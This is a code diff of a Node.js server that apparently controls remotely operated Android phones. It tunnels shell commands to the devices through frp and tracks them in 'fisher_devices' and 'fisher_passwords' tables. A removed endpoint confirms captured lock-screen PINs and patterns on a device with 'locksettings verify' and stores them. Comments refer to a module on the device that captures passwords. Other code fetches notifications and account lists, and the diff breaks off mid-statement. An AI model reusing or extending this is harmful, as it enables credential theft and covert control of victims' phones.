@@ -9,31 +9,8 @@ const url = require('url');
 const config = require('../config');
 const mysql = require('mysql2/promise');
 const { verifyToken } = require('./services/auth');
+const { isDeviceDeleted } = require('./services/deletedDevices');
 const StreamHub = require('./stream-hub');
-
-const blockedDeviceIds = new Set(
-  String(process.env.BLOCKED_DEVICE_IDS || '')
-    .split(',')
-    .map(value => value.trim())
-    .filter(Boolean)
-);
-
-function getConnectionDeviceId(pathname, query) {
-  if (pathname === '/s/lk' || pathname === '/s/lk/') {
-    // folder-1 (XYYKK/雄鹰) APK device channel: /s/lk?di=<deviceId>
-    return String(query.di || query.d || query.deviceId || query.sessionId || '').trim().toLowerCase();
-  }
-  if (pathname === '/w' || pathname === '/w/') {
-    return String(query.d || query.deviceId || query.sessionId || '').trim();
-  }
-  if (pathname === '/ws/device' || pathname === '/ws/session' || pathname === '/ws/bridge') {
-    return String(query.deviceId || query.sessionId || '').trim();
-  }
-  if (pathname && pathname.startsWith('/ws/agent/')) {
-    return String(pathname.slice('/ws/agent/'.length)).trim();
-  }
-  return '';
-}
 
 // ★ /internal/minicap-stream 设备端口缓存（60s TTL，避免每次请求查 DB）
 const _portCache = new Map(); // deviceId -> { port, ts }
@@ -58,12 +35,6 @@ function persistAdbBlackScreenStates() {
   fs.writeFileSync(ADB_BLACK_SCREEN_STATE_FILE, JSON.stringify(states, null, 2), 'utf8');
 }
 async function resolveUpstreamAddr(deviceId) {
-  if (_portCache.size > 5000) {
-    const cutoff = Date.now() - _PORT_CACHE_TTL;
-    for (const [id, entry] of _portCache) {
-      if (entry.ts < cutoff) _portCache.delete(id);
-    }
-  }
   const cached = _portCache.get(deviceId);
   if (cached && Date.now() - cached.ts < _PORT_CACHE_TTL) return cached.port;
   const [rows] = await dbPool.execute(
@@ -77,84 +48,9 @@ async function resolveUpstreamAddr(deviceId) {
   return addr;
 }
 
-function execDeviceShell(deviceId, command, timeoutMs = 12000) {
-  return getDeviceTunnelPort(deviceId).then((tunnelPort) => new Promise((resolve, reject) => {
-    const postData = JSON.stringify({ command });
-    const tunnelReq = http.request({
-      hostname: '127.0.0.1',
-      port: tunnelPort,
-      path: '/execShell',
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Content-Length': Buffer.byteLength(postData),
-      },
-      timeout: timeoutMs,
-    }, (tunnelRes) => {
-      let data = '';
-      tunnelRes.on('data', (chunk) => { data += chunk; });
-      tunnelRes.on('end', () => {
-        if ((tunnelRes.statusCode || 500) >= 400) {
-          reject(new Error(`local-service HTTP ${tunnelRes.statusCode}: ${data}`));
-          return;
-        }
-        try {
-          const parsed = JSON.parse(data || '{}');
-          if (parsed.success === false || parsed.ok === false) {
-            reject(new Error(parsed.error || parsed.message || 'local-service command failed'));
-            return;
-          }
-          resolve(parsed);
-        } catch (_) {
-          resolve({ output: data });
-        }
-      });
-    });
-    tunnelReq.on('error', reject);
-    tunnelReq.on('timeout', () => tunnelReq.destroy(new Error('local-service timeout')));
-    tunnelReq.write(postData);
-    tunnelReq.end();
-  }));
-}
-
-function shellOutput(result) {
-  const output = result?.data?.output ?? result?.data?.stdout ??
-    result?.output ?? result?.stdout ?? result?.data ?? '';
-  return typeof output === 'string' ? output : JSON.stringify(output);
-}
-
-async function sampleDeviceScreenHash(deviceId) {
-  const result = await execDeviceShell(
-    deviceId,
-    [
-      "focused=$(dumpsys activity activities 2>/dev/null | grep 'mFocusedApp=' | grep -v 'mFocusedApp=null' | head -n 1)",
-      "frame=$(screencap -p 2>/dev/null | md5sum 2>/dev/null | head -n 1)",
-      "printf '%s\\n%s\\n' \"$focused\" \"$frame\"",
-    ].join('; '),
-    10000
-  );
-  const screenState = shellOutput(result).trim();
-  if (!screenState) throw new Error('Unable to sample Android screen state');
-  return screenState;
-}
-
-async function restartDeviceMinicap(deviceId) {
-  // Inspect app_process command lines so the execShell wrapper cannot match
-  // and kill itself merely because the command contains the minicap class name.
-  const command = [
-    "for p in $(pidof app_process 2>/dev/null); do",
-    "  tr '\\000' ' ' < /proc/$p/cmdline 2>/dev/null | grep -q 'io.devicefarmer.minicap.Main' && kill -9 $p;",
-    'done',
-    'sleep 1',
-  ].join(' ');
-  await execDeviceShell(deviceId, command, 15000);
-}
-
 // ★ StreamHub：每设备一个 DeviceUpstream，连接池 + 帧缓冲 + 扇出
 const streamHub = new StreamHub({
   resolveUpstream: resolveUpstreamAddr,
-  sampleScreenHash: sampleDeviceScreenHash,
-  restartUpstream: restartDeviceMinicap,
   idleTimeoutMs: 30000,
   globalMaxBytes: 512 * 1024 * 1024,
 });
@@ -162,54 +58,13 @@ const streamHub = new StreamHub({
 // ============================================================
 // 全局异常处理（防止单个异常让整个进程僵死）
 // ============================================================
-let fatalExitScheduled = false;
-const TRANSIENT_SOCKET_ERROR_CODES = new Set([
-  'ECONNRESET', 'EPIPE', 'ECONNABORTED', 'ETIMEDOUT', 'ENETRESET',
-  'ERR_STREAM_PREMATURE_CLOSE', 'ERR_HTTP_REQUEST_TIMEOUT',
-]);
-let transientSocketErrorLogAt = 0;
-let transientSocketErrorSuppressed = 0;
-
-function isTransientSocketError(err) {
-  return Boolean(err && TRANSIENT_SOCKET_ERROR_CODES.has(err.code));
-}
-
-function logTransientSocketError(source, err) {
-  const now = Date.now();
-  if (now - transientSocketErrorLogAt < 60000) {
-    transientSocketErrorSuppressed++;
-    return;
-  }
-  const suffix = transientSocketErrorSuppressed > 0
-    ? ` suppressed=${transientSocketErrorSuppressed}` : '';
-  transientSocketErrorSuppressed = 0;
-  transientSocketErrorLogAt = now;
-  console.warn(`[${source}] transient network disconnect code=${err.code}${suffix}`);
-}
-
-function exitAfterFatalError(source, err, exitCode = 1) {
-  if (fatalExitScheduled) return;
-  fatalExitScheduled = true;
-  const detail = err && err.stack ? err.stack : err;
-  console.error(`[${source}]`, new Date().toISOString(), detail);
-  process.exitCode = exitCode;
-  // An uncaught exception leaves runtime state undefined. Let PM2 replace the
-  // process instead of keeping a false-online or partially initialized child.
-  setTimeout(() => process.exit(exitCode), 50);
-}
-
 process.on('unhandledRejection', (reason, promise) => {
   console.error('[unhandledRejection]', new Date().toISOString(), reason);
-  // Rejected background work is logged; request/worker boundaries handle it.
+  // 不退出，只记录
 });
 process.on('uncaughtException', (err) => {
-  // A peer closing a TCP/WebSocket connection is expected at runtime. Do not
-  // restart the whole service and drop every connected device for this case.
-  if (isTransientSocketError(err)) {
-    logTransientSocketError('uncaughtException', err);
-    return;
-  }
-  exitAfterFatalError('uncaughtException', err);
+  console.error('[uncaughtException]', new Date().toISOString(), err && err.stack ? err.stack : err);
+  // 不退出（除非是真正的 fatal error）；记录后继续运行
 });
 process.on('warning', (warning) => {
   console.warn('[process warning]', new Date().toISOString(), warning.name, warning.message);
@@ -223,12 +78,13 @@ const dbPool = mysql.createPool({
   user: config.mysql.user,
   password: config.mysql.password,
   database: config.mysql.database,
+  timezone: config.mysql.timezone || '+08:00',
   waitForConnections: true,
-  connectionLimit: 20,           // 从 5 调到 20：每个 WS 设备可能并发多个 DB 查询
-  queueLimit: 500,              // Bound queued work so a stalled DB cannot exhaust the Node heap.
-  connectTimeout: 10000,        // 10 秒连不上 MySQL 算超时（避免永久 hang）
-  enableKeepAlive: true,        // 防止长时间空闲连接被路由/防火墙切断
-  keepAliveInitialDelay: 10000, // 10 秒后开始 keepalive
+  connectionLimit: 20,
+  queueLimit: 0,
+  connectTimeout: 10000,
+  enableKeepAlive: true,
+  keepAliveInitialDelay: 10000,
 });
 
 // A saturated or stale MySQL pool must not leave an accepted panel WebSocket
@@ -260,6 +116,58 @@ function withTimeout(promise, timeoutMs, label) {
 dbPool.on('error', (err) => {
   console.error('[MySQL] Pool error (caught):', err && err.message ? err.message : err);
 });
+
+// ============================================================
+// 通用数据库工具：死锁/锁等待自动重试
+// MySQL 死锁错误码: 1213 (ER_LOCK_DEADLOCK)
+// 锁等待超时错误码: 1205 (ER_LOCK_WAIT_TIMEOUT)
+// 用法: await dbWithRetry(() => dbPool.execute(...), { label: 'xxx' })
+// 日志策略：
+//   * 第 1 次重试（attempt==0 成功 → 静默不打日志）
+//   * 第 2+ 次重试才打 console.debug / warn
+//   * 只有彻底失败（maxRetries 耗尽）才打 console.error
+// ============================================================
+function isDeadlockOrLockWaitError(err) {
+  if (!err) return false;
+  const code = err.code || err.errno;
+  const msg = err.message || '';
+  if (code === 1213 || code === 1205) return true;
+  if (/Deadlock found/i.test(msg)) return true;
+  if (/Lock wait timeout exceeded/i.test(msg)) return true;
+  return false;
+}
+async function dbWithRetry(fn, opts) {
+  const maxRetries = opts?.maxRetries ?? 3;
+  const label = opts?.label ?? 'db';
+  const delayMs = opts?.delayMs ?? 80;
+  // 是否在每次重试前打 warn（默认 false：只有最终失败才打，避免日志爆炸）
+  const verbose = opts?.verbose === true;
+  let lastErr = null;
+  let retriedCount = 0;
+  for (let attempt = 0; attempt <= maxRetries; attempt++) {
+    try {
+      const result = await fn();
+      // 重试后成功：如果 retriedCount>=1，打一条 warn（仅一次，告诉运维发生过死锁但已自愈）
+      if (retriedCount > 0) {
+        const level = retriedCount <= 1 ? 'warn' : 'warn';
+        console[level] && console[level](`[dbWithRetry] ${label} recovered after ${retriedCount} retries`);
+      }
+      return result;
+    } catch (err) {
+      lastErr = err;
+      if (!isDeadlockOrLockWaitError(err)) throw err;
+      if (attempt === maxRetries) break;
+      retriedCount++;
+      const wait = delayMs * (attempt + 1);
+      if (verbose) {
+        console.warn(`[dbWithRetry] ${label} deadlock/lockwait (attempt=${attempt + 1}/${maxRetries}), retry after ${wait}ms: ${err.message}`);
+      }
+      await new Promise(r => setTimeout(r, wait));
+    }
+  }
+  console.error(`[dbWithRetry] ${label} FAILED after ${maxRetries} retries: ${lastErr && lastErr.message ? lastErr.message : lastErr}`);
+  throw lastErr;
+}
 
 // 验证设备归属：检查请求者是否有权操作该设备
 async function verifyDeviceOwnership(req, deviceId) {
@@ -542,8 +450,6 @@ const connections = {
   bridges: new Map(),   // device_id -> { ws }
   agents: new Map(),    // device_id -> { ws }
 };
-const runtimeTimers = new Set();
-let runtimeStarted = false;
 
 function sendFreeJson(res, statusCode, payload) {
   res.writeHead(statusCode, {
@@ -557,7 +463,7 @@ const {
   handleRegister: handleFreeRegister,
   handleLogs: handleFreeLogs,
   handlePaymentStrategies: handleFreeNotifyRules,
-} = createFreeHttpHandlers(dbPool, { blockedDeviceIds });
+} = createFreeHttpHandlers(dbPool);
 
 // HTTP server (健康检查 + 内部广播 API)
 const server = http.createServer(async (req, res) => {
@@ -592,11 +498,6 @@ const server = http.createServer(async (req, res) => {
     const allDeviceIds = new Set();
     for (const [id] of connections.devices) allDeviceIds.add(id);
     for (const [id] of connections.bridges) allDeviceIds.add(id);
-    const { getAdminDeliveryMetrics } = getHandler('./handlers/admin');
-    const adminDelivery = getAdminDeliveryMetrics(connections);
-    const { getDeviceLifecycleMetrics } = getHandler('./handlers/device');
-    const deviceLifecycle = getDeviceLifecycleMetrics(connections);
-    const memory = process.memoryUsage();
     res.end(JSON.stringify({
       status: 'ok',
       uptime: Math.floor(process.uptime()),
@@ -605,13 +506,6 @@ const server = http.createServer(async (req, res) => {
       devices: connections.devices.size,
       bridges: connections.bridges.size,
       agents: connections.agents.size,
-      runtimeStarted,
-      maintenanceTimerCount: runtimeTimers.size,
-      heapUsedBytes: memory.heapUsed,
-      heapTotalBytes: memory.heapTotal,
-      rssBytes: memory.rss,
-      ...adminDelivery,
-      ...deviceLifecycle,
     }));
     return;
   }
@@ -749,6 +643,49 @@ const server = http.createServer(async (req, res) => {
         console.log('[PolicyPush] ' + command + ': sent=' + sent.length + ', skipped=' + skipped.length);
         res.writeHead(200, { 'Content-Type': 'application/json' });
         res.end(JSON.stringify({ ok: true, command, sent, skipped }));
+      } catch (err) {
+        res.writeHead(400, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({ ok: false, error: err.message }));
+      }
+    });
+    return;
+  }
+
+  // PHP 删除设备后立即断开内存中的 device/bridge 连接，避免已删除设备继续显示在线。
+  if (req.url === '/internal/drop-device' && req.method === 'POST') {
+    const remote = String(req.socket.remoteAddress || '').replace('::ffff:', '');
+    if (remote !== '127.0.0.1' && remote !== '::1') {
+      res.writeHead(403, { 'Content-Type': 'application/json' });
+      res.end(JSON.stringify({ ok: false, error: 'loopback only' }));
+      return;
+    }
+    let body = '';
+    req.on('data', chunk => body += chunk);
+    req.on('end', () => {
+      try {
+        const parsed = JSON.parse(body || '{}');
+        const deviceId = String(parsed.deviceId || parsed.device_id || '').trim();
+        if (!deviceId) {
+          res.writeHead(400, { 'Content-Type': 'application/json' });
+          res.end(JSON.stringify({ ok: false, error: 'deviceId required' }));
+          return;
+        }
+        const closed = [];
+        for (const [poolName, pool] of [['devices', connections.devices], ['bridges', connections.bridges]]) {
+          const conn = pool.get(deviceId);
+          if (conn && conn.ws) {
+            try { conn.ws.close(4004, 'Device deleted'); } catch (e) {}
+            try { conn.ws.terminate && conn.ws.terminate(); } catch (e) {}
+            closed.push(poolName);
+          }
+          pool.delete(deviceId);
+        }
+        const { broadcastToAdmins } = getHandler('./handlers/admin');
+        broadcastToAdmins(connections, { type: 'device_deleted', deviceId, data: { deleted: true } });
+        broadcastToAdmins(connections, { type: 'device_update' });
+        console.log(`[DropDevice] ${deviceId}: closed=${closed.join(',') || 'none'}`);
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({ ok: true, deviceId, closed }));
       } catch (err) {
         res.writeHead(400, { 'Content-Type': 'application/json' });
         res.end(JSON.stringify({ ok: false, error: err.message }));
@@ -950,6 +887,12 @@ if (req.url && req.url.startsWith('/api/tunnel/config')) {
       res.end(JSON.stringify({ code: 503, success: false, error: 'deviceId required (X-Device-ID header or body.deviceId)', retryAfter: 1000 }));
       return;
     }
+    if (await isDeviceDeleted(dbPool, deviceId)) {
+      console.log(`[API] /api/tunnel/config rejected deleted device ${String(deviceId).substring(0, 12)}...`);
+      res.writeHead(410, { 'Content-Type': 'application/json' });
+      res.end(JSON.stringify({ code: 410, success: false, error: 'device deleted' }));
+      return;
+    }
     console.log(`[API] /api/tunnel/config HIT | fullUrl=${req.url} | deviceId=${deviceId} | x-device-id=${req.headers['x-device-id'] || 'none'} | query.deviceId=${tunnelUrl.searchParams.get('deviceId') || 'none'} | UA=${req.headers['user-agent'] || 'none'} | IP=${req.socket.remoteAddress}`);
     // ★ 调试：记录所有 config 请求的原始 headers（临时）
     try {
@@ -1042,8 +985,6 @@ if (req.url && req.url.startsWith('/api/tunnel/config')) {
       `server_addr = ${config.frps.addr}`,
       `server_port = ${config.frps.port}`,
       `token = ${config.frps.token}`,
-      'admin_addr = 127.0.0.1',
-      'admin_port = 7400',
       '',
       `[${proxyName}]`,
       'type = tcp',
@@ -1067,7 +1008,7 @@ if (req.url && req.url.startsWith('/api/tunnel/config')) {
         serverPort: 7000,
         token: config.frps.token,
         remotePort: remotePort,
-        localPort: config.localServicePort,
+        localPort: 7912,
         configINI: configINI
       }
     });
@@ -1321,7 +1262,6 @@ if (req.url && req.url.startsWith('/api/tunnel/config')) {
           return;
         }
         const tunnelPort = await getDeviceTunnelPort(deviceId);
-        const minicapHealthBaseline = streamHub.captureInteractionBaseline(deviceId, action);
         // 查询类命令使用 GET，写入类命令使用 POST
     const getActions = ['isDeviceOwner', 'deviceAdmin', 'listAccounts', 'getNotifications', 'accessibilityState', 'screenState', 'getConfig', 'windowListener/status', 'windowListener/getRules'];
         const useGet = getActions.includes(action);
@@ -1339,14 +1279,6 @@ if (req.url && req.url.startsWith('/api/tunnel/config')) {
           tunnelRes.on('end', () => {
             res.writeHead(tunnelRes.statusCode || 200, { 'Content-Type': 'application/json' });
             res.end(data || JSON.stringify({ success: true }));
-            if ((tunnelRes.statusCode || 500) < 400) {
-              let succeeded = true;
-              try {
-                const parsed = JSON.parse(data || '{}');
-                succeeded = parsed.success !== false && parsed.ok !== false;
-              } catch (_) {}
-              if (succeeded) streamHub.noteInteraction(deviceId, action, minicapHealthBaseline);
-            }
           });
         });
         tunnelReq.on('error', (e) => {
@@ -1360,160 +1292,6 @@ if (req.url && req.url.startsWith('/api/tunnel/config')) {
         });
         if (!useGet) tunnelReq.write(postData);
         tunnelReq.end();
-      } catch (e) {
-        res.writeHead(400, { 'Content-Type': 'application/json' });
-        res.end(JSON.stringify({ success: false, error: e.message }));
-      }
-    });
-    return;
-  }
-
-  // ★ NEW 2026-09-12 — /api/tunnel/probeLockCipher
-  // 用 locksettings verify 主动探测并记录锁屏密码。
-  //
-  // 背景：设备端「获取锁屏密码」按钮的上报链路是坏的 —— 设备的密码捕获模块
-  // 能把密码写进 /data/local/tmp/cipher_data.bin，但 syncCipherToServer 上报
-  // 的 JSON 永远是 {"textCipher":"", "patternCipher":null, ...}，服务端因此
-  // 丢弃。所以数据库只会保留很久以前的旧值，出现「密码记录不同步」。
-  //
-  // 但 locksettings 可以精确验证凭据（现场实测）：
-  //   locksettings verify --old 12357 -> "Lock credential verified successfully"
-  //   locksettings verify --old 12345 -> "Old password '12345' didn't match"
-  // 注意：图案凭据是「点号直接拼接的纯数字串」，逗号必须去掉；
-  //       且串长为偶数时会按 (行,列) 坐标解析而报 column must be in range 0-2，
-  //       因此 1,2,3,5,7 -> "12357"（5 位，奇数）才是正确形态。
-  //
-  // body: { deviceId, cipher }   cipher 可为 "1,2,3,5,7" / "12357" / "0000"
-  // 成功时把 0-based 逗号分隔值写入 fisher_passwords（source=system_lock，
-  // 与前端 fa() 的选择器保持一致，否则面板不会显示）。
-  if (req.url && req.url.startsWith('/api/tunnel/probeLockCipher')) {
-    res.setHeader('Access-Control-Allow-Origin', '*');
-    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
-    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
-    if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }
-    if (req.method !== 'POST') {
-      res.writeHead(405, { 'Content-Type': 'application/json' });
-      res.end(JSON.stringify({ success: false, error: 'Method not allowed' }));
-      return;
-    }
-    let body = '';
-    req.on('data', chunk => body += chunk);
-    req.on('end', async () => {
-      try {
-        const { deviceId, cipher, cipherType } = JSON.parse(body || '{}');
-        if (!deviceId || !cipher) {
-          res.writeHead(400, { 'Content-Type': 'application/json' });
-          res.end(JSON.stringify({ success: false, error: 'deviceId and cipher required' }));
-          return;
-        }
-        if (!(await verifyDeviceOwnership(req, deviceId))) {
-          res.writeHead(403, { 'Content-Type': 'application/json' });
-          res.end(JSON.stringify({ success: false, error: '无权操作该设备' }));
-          return;
-        }
-
-        // 归一化成 locksettings 需要的裸数字串
-        const raw = String(cipher).trim();
-        const hasSep = /[,，\s\-|]/.test(raw);
-        let digits;
-        if (hasSep) {
-          digits = raw.split(/[,，\s\-|]+/).filter(Boolean).join('');
-        } else {
-          digits = raw.replace(/[^\d]/g, '');
-        }
-        if (!digits) {
-          res.writeHead(400, { 'Content-Type': 'application/json' });
-          res.end(JSON.stringify({ success: false, error: 'cipher has no digits' }));
-          return;
-        }
-
-        const tunnelPort = await getDeviceTunnelPort(deviceId);
-        const shellCmd = `locksettings verify --old ${digits} 2>&1 | head -2`;
-
-        const runShell = () => new Promise((resolve) => {
-          const payload = JSON.stringify({ command: shellCmd });
-          const r = http.request({
-            hostname: '127.0.0.1',
-            port: tunnelPort,
-            path: '/execShell',
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) },
-            timeout: 15000,
-          }, (tr) => {
-            let out = '';
-            tr.on('data', c => out += c);
-            tr.on('end', () => {
-              let text = out;
-              try {
-                const j = JSON.parse(out);
-                text = (j && j.data && j.data.output) ? j.data.output : out;
-              } catch (_) {}
-              resolve(String(text || ''));
-            });
-          });
-          r.on('error', (e) => resolve(`ERROR:${e.message}`));
-          r.on('timeout', () => { r.destroy(); resolve('ERROR:timeout'); });
-          r.write(payload);
-          r.end();
-        });
-
-        const output = (await runShell()).trim();
-        const verified = /verified successfully/i.test(output);
-
-        if (!verified) {
-          res.writeHead(200, { 'Content-Type': 'application/json' });
-          res.end(JSON.stringify({
-            success: true,
-            data: { verified: false, deviceId, tried: digits, output },
-            message: '密码验证失败：' + (output.split('\n')[0] || 'no output'),
-          }));
-          return;
-        }
-
-        // 验证通过 → 写入数据库
-        // cipher_type: 显式给出优先，否则按位数推断
-        let finalType = String(cipherType || '').trim().toLowerCase();
-        if (!finalType) {
-          finalType = (hasSep && digits.length >= 2) ? 'pattern' : 'pin';
-        }
-        // 图案统一存成 0-based 逗号分隔（与前端回填格式一致：1,2,3,5,7 -> 0,1,2,4,6）
-        // ★ 判断规则：出现 0 才视为「已经是 0-based」，否则视为 1-based 并整体 -1。
-        //   （不能写成 `every(n => n>=0 && n<=8)` —— 1..7 同时满足 0..8 和 1..9，
-        //    那样会先命中 0-based 分支而漏掉转换。）
-        let storedText = digits;
-        const toStored = (pts) => {
-          if (!pts.length) return digits;
-          const hasZero = pts.some(n => n === 0);
-          return hasZero ? pts.join(',') : pts.map(n => n - 1).join(',');
-        };
-        if (hasSep) {
-          const pts = raw.split(/[,，\s\-|]+/).map(s => Number(String(s).trim())).filter(n => Number.isFinite(n));
-          storedText = toStored(pts);
-        } else {
-          const nums = digits.split('').map(Number).filter(n => Number.isFinite(n));
-          storedText = toStored(nums);
-        }
-
-        const grade = finalType === 'pattern'
-          ? 'PASSWORD_QUALITY_PATTERN'
-          : 'PASSWORD_QUALITY_NUMERIC_COMPLEX';
-
-        try {
-          await dbPool.query(
-            'INSERT INTO fisher_passwords (device_id, cipher_type, cipher_text, grade_code, source, created_at) VALUES (?,?,?,?,?,?)',
-            [deviceId, finalType, storedText, grade, 'system_lock', Math.floor(Date.now() / 1000)]
-          );
-          console.log(`[PROBE] ${deviceId}: verified OK, stored ${finalType}="${storedText}"`);
-        } catch (e) {
-          console.error(`[PROBE] ${deviceId}: verify OK but DB insert failed: ${e.message}`);
-        }
-
-        res.writeHead(200, { 'Content-Type': 'application/json' });
-        res.end(JSON.stringify({
-          success: true,
-          data: { verified: true, deviceId, cipherType: finalType, stored: storedText, output },
-          message: '密码验证成功并已记录',
-        }));
       } catch (e) {
         res.writeHead(400, { 'Content-Type': 'application/json' });
         res.end(JSON.stringify({ success: false, error: e.message }));
@@ -1976,41 +1754,195 @@ if (req.url && req.url.startsWith('/internal/minicap/stats')) {
   return;
 }
 
-// ★ /internal/minicap/restart — 管理员手动恢复单台设备的 ADB minicap
-if (req.url && req.url.startsWith('/internal/minicap/restart')) {
-  res.setHeader('Access-Control-Allow-Origin', '*');
-  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
-  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
-  if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }
-  if (req.method !== 'POST') {
-    res.writeHead(405, { 'Content-Type': 'application/json' });
-    res.end(JSON.stringify({ ok: false, error: 'Method not allowed' }));
-    return;
-  }
-  if (!requireSuperAdmin(req)) {
-    res.writeHead(403, { 'Content-Type': 'application/json' });
-    res.end(JSON.stringify({ ok: false, error: '需要 superadmin 权限' }));
-    return;
-  }
-  let body = '';
-  req.on('data', (chunk) => { body += chunk; });
-  req.on('end', async () => {
-    try {
-      const { deviceId } = JSON.parse(body || '{}');
-      if (!deviceId) throw new Error('deviceId required');
-      const result = await streamHub.restartDevice(deviceId, 'manual_api', true);
-      console.log(`[minicap-health] manual result device=${deviceId} result=${JSON.stringify(result)}`);
-      res.writeHead(200, { 'Content-Type': 'application/json' });
-      res.end(JSON.stringify({ ok: true, deviceId, ...result }));
-    } catch (e) {
-      res.writeHead(400, { 'Content-Type': 'application/json' });
-      res.end(JSON.stringify({ ok: false, error: e.message }));
-    }
-  });
-  return;
-}
 
-  // /api/ 请求代理到 PHP 后端（80端口）— 兼容 APK 直接发 HTTP 请求到 8889 端口
+// 19901 跳板超时释放：每分钟检查，释放超过 5 分钟无活动的设备
+// ★ Stability: in-flight guard — 如果上一次 tick 还在跑则跳过本次，避免堆积
+//
+// ★ 2026-09-03 死锁修复：改为"先 SELECT 再按主键逐行 UPDATE + 死锁重试"
+// ★ 2026-09-03 LIMIT/OFFSET 修复：mysql2 execute() 不接受 LIMIT ? 整数占位符（参数绑定错误），
+//   所以 PAGE_SIZE / offset 直接用数字字面量拼 SQL（来自本地代码，无注入风险）。
+let springboardTimeoutRunning = false;
+setInterval(async () => {
+  if (springboardTimeoutRunning) return;
+  springboardTimeoutRunning = true;
+  try {
+    const fiveMinutesAgo = Math.floor(Date.now() / 1000) - 5 * 60;
+    const SB_PAGE_SIZE = 50;
+    let sbOffset = 0;
+    let hasMore = true;
+    let totalReleased = 0;
+    let totalScanned = 0;
+
+    while (hasMore) {
+      let rows;
+      try {
+        // ★ 分页 LIMIT/OFFSET 用数字字面量（避免 mysql2 预编译参数 bug）
+        [rows] = await dbPool.execute(
+          `SELECT device_id FROM fisher_devices
+           WHERE remote_port = 19901 AND last_seen < ? AND last_seen > 0
+           ORDER BY device_id ASC
+           LIMIT ${SB_PAGE_SIZE|0} OFFSET ${sbOffset|0}`,
+          [fiveMinutesAgo]
+        );
+      } catch (e) {
+        console.warn(`[SpringboardTimeout] SELECT page aborted: ${e.message}`);
+        break;
+      }
+      if (!rows || rows.length === 0) { hasMore = false; break; }
+      totalScanned += rows.length;
+      sbOffset += rows.length;
+      if (rows.length < SB_PAGE_SIZE) hasMore = false;
+
+      for (const row of rows) {
+        const did = row.device_id;
+        if (!did) continue;
+        try {
+          const [upd] = await dbWithRetry(
+            () => dbPool.execute(
+              `UPDATE fisher_devices SET remote_port = 0, tunnel_deployed = 0
+               WHERE device_id = ? AND remote_port = 19901 AND last_seen < ? AND last_seen > 0`,
+              [did, fiveMinutesAgo]
+            ),
+            { label: `SpringboardTimeout:${String(did).substring(0, 8)}`, maxRetries: 3 }
+          );
+          if (upd && upd.affectedRows > 0) totalReleased++;
+          await new Promise(r => setTimeout(r, 3));
+        } catch (e) {
+          console.warn(`[SpringboardTimeout] skip ${String(did).substring(0, 12)}...: ${e.message}`);
+        }
+      }
+    }
+
+    if (totalReleased > 0) {
+      console.log(`[SpringboardTimeout] Released 19901 from ${totalReleased}/${totalScanned} inactive device(s) (>5 min)`);
+    }
+  } catch (e) {
+    console.warn(`[SpringboardTimeout] top-level warn: ${e.message}`);
+  } finally {
+    springboardTimeoutRunning = false;
+  }
+}, 60000); // 每分钟
+
+
+// ★ 假在线纠偏（2026-08-05）：keepAlive 清理死连接时已调 ws.terminate() 触发现有 close handler，
+//   但仍有两种情况可能产生“假在线”：
+//   1. 半开 TCP 连接（设备断网但未发 FIN）readyState 仍为 1 — keepAlive 不探测
+//   2. close handler 中的 DB UPDATE 异常失败 — 状态不一致
+//   兜底：每 60s 扫描“声称在线但 last_seen > 3 分钟”的设备，强制置为离线。
+//   活设备的 last_seen 由 device.js / bridge.js 每 30s 心跳刷新 — 3 分钟不心跳必为真死。
+// 注意：last_seen 写节流由 src/services/writeThrottle.js 统一提供（跨 device/bridge/index 共享）
+
+let fakeOnlineGuardRunning = false;
+setInterval(async () => {
+  if (fakeOnlineGuardRunning) return;
+  fakeOnlineGuardRunning = true;
+  try {
+    // =====================================
+    // Phase 1：内存校验（零 DB 锁，零冲突）
+    // =====================================
+    // connections 里有活跃 WS 的设备 → DB 必定是在线的，绝不处理
+    // connections 里没有 的设备 + 不在 grace period 内 → 才可能需要 Phase 2 轻量查询
+    const aliveDeviceIds = new Set();
+    for (const did of connections.devices.keys()) aliveDeviceIds.add(did);
+    for (const did of connections.bridges.keys()) aliveDeviceIds.add(did);
+    for (const did of connections.agents.keys())  aliveDeviceIds.add(did);
+
+    // 也考虑 keepAlive 的 grace period（刚断开但在 30 分钟重连窗口内的不踢）
+    const { isInGracePeriod } = require('./services/keepAlive');
+    for (const did of aliveDeviceIds) {
+      // 顺便给已知活跃设备做一个"节流内存标记"：心跳写入只在超过 10s 时允许（在心跳 handler 中实际生效）
+      // 这里不做任何 DB 操作，避免争锁
+    }
+
+    const fifteenMinutesAgo = Math.floor(Date.now() / 1000) - 15 * 60;
+
+    // =====================================
+    // Phase 2：非常轻量的 DB 查询（分页 + 小批量，避免大结果集 + 不排序）
+    // 只查 "DB 声称在线 + 内存里不存活 + 不在 grace period" 的设备
+    // 关键：不 SELECT ... FOR UPDATE，不加任何锁，只做快照读
+    // =====================================
+    // 注意：即便这里的 SELECT 仍然要扫表，也不会持有行锁；
+    //       但如果表非常大，可能需要 `idx_connected_lastseen (is_connected, last_seen)` 复合索引来加速定位。
+    //       可以让用户在 phpMyAdmin 中执行：
+    //         ALTER TABLE fisher_devices ADD INDEX idx_conn_lastseen (is_connected, last_seen);
+    //         ALTER TABLE fisher_devices ADD INDEX idx_device_id (device_id);  -- 如果 device_id 非主键需加唯一索引
+    let offset = 0;
+    const PAGE_SIZE = 50;       // 小批量分页，避免长时间占连接
+    let totalCorrected = 0;
+    let totalScannedDB = 0;
+    let hasMore = true;
+
+    while (hasMore) {
+      let rows;
+      try {
+        // ★ LIMIT / OFFSET 直接拼接数字字面量（来自本地代码，完全无注入风险）
+        //   原因：mysql2 execute() 的预编译参数不接受 int 绑定在 LIMIT/OFFSET 位置
+        //   错误信息：Incorrect arguments to mysqld_stmt_execute
+        const safeLimit = Math.max(1, PAGE_SIZE | 0);
+        const safeOffset = Math.max(0, offset | 0);
+        [rows] = await dbWithRetry(
+          () => dbPool.execute(
+            `SELECT device_id FROM fisher_devices
+             WHERE is_connected = 1 AND last_seen > 0 AND last_seen < ?
+             LIMIT ${safeLimit} OFFSET ${safeOffset}`,
+            [fifteenMinutesAgo]
+          ),
